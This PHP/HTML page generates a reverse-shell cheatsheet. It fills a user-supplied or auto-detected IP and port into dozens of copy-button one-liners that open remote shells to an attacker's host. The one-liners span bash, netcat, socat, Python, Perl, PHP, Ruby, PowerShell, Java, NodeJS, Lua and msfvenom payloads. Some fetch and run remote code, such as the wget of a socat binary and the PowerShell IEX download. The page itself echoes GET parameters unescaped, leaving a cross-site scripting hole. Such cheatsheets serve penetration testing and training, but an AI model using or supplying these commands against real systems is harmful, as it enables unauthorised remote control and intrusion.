<!DOCTYPE html>
<html>
<head>
  <title>Reverse shell cheatsheet</title>
<script>
function disableScrolling(){
    var x=window.scrollX;
    var y=window.scrollY;
    window.onscroll=function(){window.scrollTo(x, y);};
}

function enableScrolling(){
    window.onscroll=function(){};
}

function copy(item_id) {
  disableScrolling();
  var copyText = document.getElementById(item_id).textContent;
  const textArea = document.getElementById('txt');
  textArea.textContent = copyText;
  textArea.select();
  document.execCommand("copy");
  enableScrolling();
  return false;
}
</script>
<style type="text/css">
body{
font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;
background-color: #ccc;
}
button{

  padding:0 5px;
  margin:0;
}
textarea {
  position: fixed;
  left: -100%;
}
pre{
  font-family: SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;
  font-size:12px;
  background-color: #f6f8fa;
  overflow: auto;
    border: 1px solid #898989;
    padding: 5px;
}
.main{
  max-width:800px;
  margin:auto;
  background-color: #fff;
  padding:15px;
  border: 1px solid #898989;
}
input[type=text]{
  border: 1px solid #898989;
  font-size:22px;
width:200px;
}
</style>
</head>
<body>
<div class="main">

<?php

function PrIp(){
    $ExIpJsonUrl = "http://apps.game.qq.com/comm-htdocs/ip/get_ip.php";
    $ExIpJsonData = file_get_contents($ExIpJsonUrl);
    $Arr = json_decode($ExIpJsonData,true);
    $ReJson = $Arr['ip_address'];
    return $ReJson;
}

if (!isset($_GET['ip'])){
  $ip = PrIp();
}else{
  $ip = $_GET['ip'];
}

if (!isset($_GET['port'])){
  $port = '443';
}else{
  $port = $_GET['port'];
}
?>

<form method="get" action="">
IP: <input type="text" value="<?php echo $ip;?>" name="ip">
 Port: <input type="text" value="<?php echo $port;?>" name="port">
 <input type="submit" value="Change">
</form>
<textarea id="txt"></textarea>
<h3>Bash TCP:</h3>
Victim:
<pre id="cmd001">bash -i >& /dev/tcp/<?php echo $ip;?>/<?php echo $port;?> 0>&1</pre>
<button onclick="copy('cmd001')">Copy</button>
<pre id="cmd002">/bin/bash -i > /dev/tcp/<?php echo $ip;?>/<?php echo $port;?> 0<& 2>&1</pre>
<button onclick="copy('cmd002');">Copy</button>
<pre id="cmd003">exec 5<>/dev/tcp/<?php echo $ip;?>/<?php echo $port;?>;cat <&5 | while read line; do $line 2>&5 >&5; done</pre>
<button onclick="copy('cmd003');">Copy</button>
<pre id="cmd004">exec /bin/sh 0&lt;/dev/tcp/<?php echo $ip;?>/<?php echo $port;?> 1>&0 2>&0</pre>
<button onclick="copy('cmd004');">Copy</button>
<pre id="cmd005">0<&196;exec 196<>/dev/tcp/<?php echo $ip;?>/<?php echo $port;?>; sh <&196 >&196 2>&196</pre>
<button onclick="copy('cmd005');">Copy</button>

<h3>Bash UDP:</h3>
Victim:
<pre id="cmd006">sh -i >& /dev/udp/<?php echo $ip;?>/<?php echo $port;?> 0>&1</pre>
<button onclick="copy('cmd006');">Copy</button><br>
Listener:
<pre id="cmd007">nc -u -lvp <?php echo $port;?></pre>
<button onclick="copy('cmd007');">Copy</button>

<h3>Netcat:</h3>
<pre id="nc01">nc -e /bin/sh <?php echo $ip;?> <?php echo $port;?></pre>
<button onclick="copy('nc01');">Copy</button>
<pre id="nc02">nc -e /bin/bash <?php echo $ip;?> <?php echo $port;?></pre>
<button onclick="copy('nc02');">Copy</button>
<pre id="nc03">nc -c bash <?php echo $ip;?> <?php echo $port;?></pre>
<button onclick="copy('nc03');">Copy</button>
<pre id="nc04">mknod backpipe p && nc <?php echo $ip;?> <?php echo $port;?> 0&lt;backpipe | /bin/bash 1>backpipe </pre>
<button onclick="copy('nc04');">Copy</button>
<pre id="nc05">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <?php echo $ip;?> <?php echo $port;?> >/tmp/f</pre>
<button onclick="copy('nc05');">Copy</button>
<pre id="nc06">rm -f /tmp/p; mknod /tmp/p p && nc <?php echo $ip;?> <?php echo $port;?> 0/tmp/p 2>&1</pre>
<button onclick="copy('nc06');">Copy</button>
<pre id="nc07">rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc <?php echo $ip;?> <?php echo $port;?> > f</pre>
<button onclick="copy('nc07');">Copy</button>
<pre id="nc08">rm -f x; mknod x p && nc <?php echo $ip;?> <?php echo $port;?> 0&lt;x | /bin/bash 1>x</pre>
<button onclick="copy('nc08');">Copy</button>

<h3>Ncat:</h3>
<pre id="ncat01">ncat <?php echo $ip;?> <?php echo $port;?> -e /bin/bash</pre>
<button onclick="copy('ncat01');">Copy</button>
<pre id="ncat02">ncat --udp <?php echo $ip;?> <?php echo $port;?> -e /bin/bash</pre>
<button onclick="copy('ncat02');">Copy</button>

<h3>Telnet:</h3>
<pre id="telnet01">rm -f /tmp/p; mknod /tmp/p p && telnet <?php echo $ip;?> <?php echo $port;?> 0/tmp/p 2>&1</pre>
<button onclick="copy('telnet01');">Copy</button>
<pre id="telnet02">telnet <?php echo $ip;?> <?php echo $port;?> | /bin/bash | telnet <?php echo $ip;?> 444</pre>
<button onclick="copy('telnet02');">Copy</button>
<pre id="telnet03">rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet <?php echo $ip;?> <?php echo $port;?> > f</pre>
<button onclick="copy('telnet03');">Copy</button>
<pre id="telnet04">rm -f x; mknod x p && telnet <?php echo $ip;?> <?php echo $port;?> 0&lt;x | /bin/bash 1>x</pre>
<button onclick="copy('telnet04');">Copy</button>

<h3>Socat:</h3>
Victim:
<pre id="socat01">/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<?php echo $ip;?>:<?php echo $port;?></pre>
<button onclick="copy('socat01');">Copy</button>
<pre id="socat02">socat tcp-connect:<?php echo $ip;?>:<?php echo $port;?> exec:"bash -li",pty,stderr,setsid,sigint,sane</pre>
<button onclick="copy('socat02');">Copy</button><br>
Listener:
<pre id="socat03">socat file:`tty`,raw,echo=0 TCP-L:<?php echo $port;?></pre>
<button onclick="copy('socat03');">Copy</button>
<br>
Victim:
<pre id="socat04">wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<?php echo $ip;?>:<?php echo $port;?></pre>
<button onclick="copy('socat04');">Copy</button>

<h3>Perl:</h3>
Victim:
<pre id="perl01">perl -e 'use Socket;$i="<?php echo $ip;?>";$p=<?php echo $port;?>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'</pre>
<button onclick="copy('perl01');">Copy</button>

<pre id="perl02">perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<?php echo $ip;?>:<?php echo $port;?>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'</pre>
<button onclick="copy('perl02');">Copy</button><br>

Windows only, Victim:
<pre id="perl03">perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"<?php echo $ip;?>:<?php echo $port;?>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'</pre>
<button onclick="copy('perl03');">Copy</button>

<h3>Python:</h3>
IP v4
<pre id="python01">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<?php echo $ip;?>",<?php echo $port;?>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</pre>
<button onclick="copy('python01');">Copy</button>

<pre id="python02">export RHOST="<?php echo $ip;?>";export RPORT=<?php echo $port;?>;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'</pre>
<button onclick="copy('python02');">Copy</button>

<pre id="python03">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<?php echo $ip;?>",<?php echo $port;?>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</pre>
<button onclick="copy('python03');">Copy</button>

IP v6
<pre id="python04">python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",<?php echo $port;?>,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'</pre>
<button onclick="copy('python04');">Copy</button>

Windows only:
<pre id="python05">C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('<?php echo $ip;?>', <?php echo $port;?>)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"</pre>
<button onclick="copy('python05');">Copy</button>

<h3>PHP:</h3>
<pre id="php01">php -r '$sock=fsockopen("<?php echo $ip;?>",<?php echo $port;?>);exec("/bin/sh -i <&3 >&3 2>&3");'</pre>
<button onclick="copy('php01');">Copy</button>
<pre id="php02">php -r '$s=fsockopen("<?php echo $ip;?>",<?php echo $port;?>);$proc=proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s),$pipes);'</pre>
<button onclick="copy('php02');">Copy</button>
<pre id="php03">php -r '$s=fsockopen("<?php echo $ip;?>",<?php echo $port;?>);shell_exec("/bin/sh -i <&3 >&3 2>&3");'</pre>
<button onclick="copy('php03');">Copy</button>
<pre id="php04">php -r '$s=fsockopen("<?php echo $ip;?>",<?php echo $port;?>);`/bin/sh -i <&3 >&3 2>&3`;'</pre>
<button onclick="copy('php04');">Copy</button>
<pre id="php05">php -r '$s=fsockopen("<?php echo $ip;?>",<?php echo $port;?>);system("/bin/sh -i <&3 >&3 2>&3");'</pre>
<button onclick="copy('php05');">Copy</button>
<pre id="php06">php -r '$s=fsockopen("<?php echo $ip;?>",<?php echo $port;?>);popen("/bin/sh -i <&3 >&3 2>&3", "r");'</pre>
<button onclick="copy('php06');">Copy</button>

<h3>Ruby:</h3>
<pre id="ruby01">ruby -rsocket -e'f=TCPSocket.open("<?php echo $ip;?>",<?php echo $port;?>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'</pre>
<button onclick="copy('ruby01');">Copy</button>

<pre id="ruby02">ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<?php echo $ip;?>","<?php echo $port;?>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</pre>
<button onclick="copy('ruby02');">Copy</button><br>

NOTE: Windows only
<pre id="ruby03">ruby -rsocket -e 'c=TCPSocket.new("<?php echo $ip;?>","<?php echo $port;?>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</pre>
<button onclick="copy('ruby03');">Copy</button>



<h3>OpenSSL:</h3>
Attacker:
<pre id="ssl01">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</pre>
<button onclick="copy('ssl01');">Copy</button>
<pre id="ssl02">openssl s_server -quiet -key key.pem -cert cert.pem -port <?php echo $port;?></pre>
<button onclick="copy('ssl02');">Copy</button>
or
<pre id="ssl03">ncat --ssl -vv -l -p <?php echo $port;?></pre>
<button onclick="copy('ssl03');">Copy</button>
Victim:
<pre id="ssl04">mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <?php echo $ip;?>:<?php echo $port;?> > /tmp/s; rm /tmp/s</pre>
<button onclick="copy('ssl04');">Copy</button>

<h3>Powershell:</h3>
<pre id="ps01">powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<?php echo $ip;?>",<?php echo $port;?>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</pre>
<button onclick="copy('ps01');">Copy</button>
<pre id="ps02">powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<?php echo $ip;?>',<?php echo $port;?>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</pre>
<button onclick="copy('ps02');">Copy</button>
<pre id="ps03">powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')</pre>
<button onclick="copy('ps03');">Copy</button>

<h3>Awk:</h3>
<pre id="awk01">awk 'BEGIN {s = "/inet/tcp/0/<?php echo $ip;?>/<?php echo $port;?>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null</pre>
<button onclick="copy('awk01');">Copy</button>

<h3>TCLsh</h3>
<pre id="tcl01">echo 'set s [socket <?php echo $ip;?> <?php echo $port;?>];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh</pre>
<button onclick="copy('tcl01');">Copy</button>

<h3>Java:</h3>
<pre id="java01">r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<?php echo $ip;?>/<?php echo $port;?>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()</pre>
<button onclick="copy('java01');">Copy</button>
<pre id="java02">String host="127.0.0.1";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</pre>
<button onclick="copy('java02');">Copy</button>
<pre id="java03">Thread thread = new Thread(){
    public void run(){
        // Reverse shell here
    }
}
thread.start();</pre>
<button onclick="copy('java03');">Copy</button>

<h3>War:</h3>
<pre id="war01">msfvenom -p java/jsp_shell_reverse_tcp LHOST=<?php echo $ip;?> LPORT=<?php echo $port;?> -f war > reverse.war
strings reverse.war | grep jsp # in order to get the name of the file</pre>
<button onclick="copy('war01');">Copy</button>

<h3>Lua:</h3>
Linux only
<pre id="lua01">lua -e "require('socket');require('os');t=socket.tcp();t:connect('<?php echo $ip;?>','<?php echo $port;?>');os.execute('/bin/sh -i <&3 >&3 2>&3');"</pre>
<button onclick="copy('lua01');">Copy</button><br>
Windows and Linux
<pre id="lua02">lua5.1 -e 'local host, port = "<?php echo $ip;?>", <?php echo $port;?> local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'</pre>
<button onclick="copy('lua02');">Copy</button>

<h3>NodeJS:</h3>
<pre id="ndjs01">(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(<?php echo $port;?>, "<?php echo $ip;?>", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();</pre>
<button onclick="copy('ndjs01');">Copy</button>
<pre id="ndjs02">require('child_process').exec('nc -e /bin/sh <?php echo $ip;?> <?php echo $port;?>')</pre>
<button onclick="copy('ndjs02');">Copy</button>
<pre id="ndjs03">-var x = global.process.mainModule.require
-x('child_process').exec('nc <?php echo $ip;?> <?php echo $port;?> -e /bin/bash')</pre>
<button onclick="copy('ndjs03');">Copy</button>
<pre id="ndjs04">https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py</pre>
<button onclick="copy('ndjs04');">Copy</button>

<h3>Groovy:</h3>

<pre id="groovy01">String host="<?php echo $ip;?>";
int port=<?php echo $port;?>;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</pre>
<button onclick="copy('groovy01');">Copy</button>

<h3>Meterpreter Shell:</h3>
<pre id="msf01">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<?php echo $ip;?> LPORT=<?php echo $port;?> -f exe > reverse.exe</pre>
<button onclick="copy('msf01');">Copy</button>
<pre id="msf02">msfvenom -p windows/shell_reverse_tcp LHOST=<?php echo $ip;?> LPORT=<?php echo $port;?> -f exe > reverse.exe</pre>
<button onclick="copy('msf02');">Copy</button>
<pre id="msf03">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<?php echo $ip;?> LPORT=<?php echo $port;?> -f elf >reverse.elf</pre>
<button onclick="copy('msf03');">Copy</button>
<pre id="msf04">msfvenom -p linux/x86/shell_reverse_tcp LHOST=<?php echo $ip;?> LPORT=<?php echo $port;?> -f elf >reverse.elf</pre>
<button onclick="copy('msf04');">Copy</button>
<pre id="msf05">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="<?php echo $ip;?>" LPORT=<?php echo $port;?> -f elf > shell.elf</pre>
<button onclick="copy('msf05');">Copy</button>
<pre id="msf06">msfvenom -p windows/meterpreter/reverse_tcp LHOST="<?php echo $ip;?>" LPORT=<?php echo $port;?> -f exe > shell.exe</pre>
<button onclick="copy('msf06');">Copy</button>
<pre id="msf07">msfvenom -p osx/x86/shell_reverse_tcp LHOST="<?php echo $ip;?>" LPORT=<?php echo $port;?> -f macho > shell.macho</pre>
<button onclick="copy('msf07');">Copy</button>
<pre id="msf08">msfvenom -p windows/meterpreter/reverse_tcp LHOST="<?php echo $ip;?>" LPORT=<?php echo $port;?> -f asp > shell.asp</pre>
<button onclick="copy('msf08');">Copy</button>
<pre id="msf09">msfvenom -p java/jsp_shell_reverse_tcp LHOST="<?php echo $ip;?>" LPORT=<?php echo $port;?> -f raw > shell.jsp</pre>
<button onclick="copy('msf09');">Copy</button>
<pre id="msf10">msfvenom -p java/jsp_shell_reverse_tcp LHOST="<?php echo $ip;?>" LPORT=<?php echo $port;?> -f war > shell.war</pre>
<button onclick="copy('msf10');">Copy</button>
<pre id="msf11">msfvenom -p cmd/unix/reverse_python LHOST="<?php echo $ip;?>" LPORT=<?php echo $port;?> -f raw > shell.py</pre>
<button onclick="copy('msf11');">Copy</button>
<pre id="msf12">msfvenom -p cmd/unix/reverse_bash LHOST="<?php echo $ip;?>" LPORT=<?php echo $port;?> -f raw > shell.sh</pre>
<button onclick="copy('msf12');">Copy</button>
<pre id="msf13">msfvenom -p cmd/unix/reverse_perl LHOST="<?php echo $ip;?>" LPORT=<?php echo $port;?> -f raw > shell.pl</pre>
<button onclick="copy('msf13');">Copy</button>


<h3>Xterm:</h3>
<pre id="xterm001">xterm -display <?php echo $ip;?>:1
Xnest :1
xhost +targetip</pre>
<button onclick="copy('xterm001');">Copy</button>
</div>

</body>
</html>
